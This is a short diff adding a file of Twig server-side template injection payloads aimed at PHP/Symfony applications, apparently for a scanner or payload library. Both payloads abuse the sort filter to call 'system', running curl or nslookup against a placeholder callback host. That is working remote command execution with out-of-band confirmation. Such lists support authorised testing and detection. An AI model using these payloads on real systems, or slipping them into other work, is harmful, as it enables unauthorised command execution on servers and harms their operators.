@@ -1,0 +1,4 @@
+# Twig SSTI payloads - PHP template engine (Symfony)
+# {{CALLBACK}} replaced with callback URL
+{{ ['curl {{CALLBACK}}','']|sort('system') }}
+{{ ['nslookup {{CALLBACK}}','']|sort('system') }}
